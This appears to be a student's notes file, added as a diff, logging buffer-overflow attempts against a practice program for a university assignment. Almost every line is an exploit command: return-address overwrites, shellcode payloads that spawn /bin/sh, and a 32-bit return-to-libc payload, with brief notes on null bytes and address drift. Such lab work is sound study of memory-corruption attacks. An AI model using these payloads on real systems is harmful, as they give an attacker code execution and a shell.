@@ -1,0 +1,22 @@
+hackthisprogram1.c(access granted but segfault before returning from main because rbp corrupted, can retain correct rbp but requires \x00\x00 in payload)
+r $(python -c 'print("A"*12+"B"*16+"C"*8+"\x24\x52\x55\x55\x55\x55\x00\x00")')
+for 36 bytes outside gdb
+/mnt/storage/sem7/crypto/Assignment\ 4/C\ Code/hackthisprogram1 $(python -c 'print("A"*36+"B"*36+"\x24\x52\x55\x55\x55\x55\x00\x00")')
+does not work because of the \x00\x00 in payload
+r $(python -c '__import__("sys").stdout.buffer.write(b"\x41"*12+b"\x42"*16+b"\xc0\xd9\xff\xff\xff\x7f\x00\x00"+b"\xa2\x51\x55\x55\x55\x55\x00\x00")')
+
+shellcode must be 24 bytes or under, between strcpy and return, 4 bytes are set to \x00 w.r.t. an offset from %rbp(register)
+shellcode(illegal instruction \x89)
+# r $(python -c '__import__("sys").stdout.buffer.write(b"\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"+b"\x41"*4+b"\xa4\xd9\xff\xff\xff\x7f\x00\x00")')
+23 byte shellcode(segfaults at \x99 instruction)
+r $(python -c '__import__("sys").stdout.buffer.write(b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"+b"\x41"*13+b"\xa4\xd9\xff\xff\xff\x7f\x00\x00")')
+if buffer size is changed to 36 bytes, shellcode can be 36 bytes
+r $(python -c '__import__("sys").stdout.buffer.write(b"\xeb\x08\x2f\x62\x69\x6e\x2f\x73\x68\xff\x31\xc0\x88\x05\xf7\xff\xff\xff\x48\x8d\x3d\xe9\xff\xff\xff\x50\x57\x48\x89\xe6\x31\xd2\xb0\x3b\x0f\x05"+b"\x41"*36+b"\x60\xd9\xff\xff\xff\x7f\x00\x00")')
+outside gdb with 36 bytes
+last address starting with \x50 is prone to change, to get correct address, use gdb and check address of Password with 'x Password'. unset env LINES and COLUMNS in gdb to have the same env variables as shell.
+/mnt/storage/sem7/crypto/Assignment\ 4/C\ Code/hackthisprogram1 $(python -c '__import__("sys").stdout.buffer.write(b"\xeb\x08\x2f\x62\x69\x6e\x2f\x73\x68\xff\x31\xc0\x88\x05\xf7\xff\xff\xff\x48\x8d\x3d\xe9\xff\xff\xff\x50\x57\x48\x89\xe6\x31\xd2\xb0\x3b\x0f\x05"+b"\x41"*36+b"\x50\xd9\xff\xff\xff\x7f\x00\x00")')
+
+
+return to libc 32 bit 12 bytes, works without -z execstack, launches /bin/sh from libc 'system' function
+r $(python -c '__import__("sys").stdout.buffer.write(b"\x41"*16+b"\xf4\x8f\x55\x56"+b"\x18\xcc\xff\xff"+b"\x40\x98\xc4\xf7"+b"\x41"*4+b"\xaa\xaf\xdb\xf7")')
+/mnt/storage/devel/cryptography/Assignment\ 4/C\ Code/hackthisprogram1.out $(python -c '__import__("sys").stdout.buffer.write(b"\x41"*16+b"\xf4\x8f\x55\x56"+b"\x18\xcc\xff\xff"+b"\x40\x98\xc4\xf7"+b"\x41"*4+b"\xaa\xaf\xdb\xf7")')
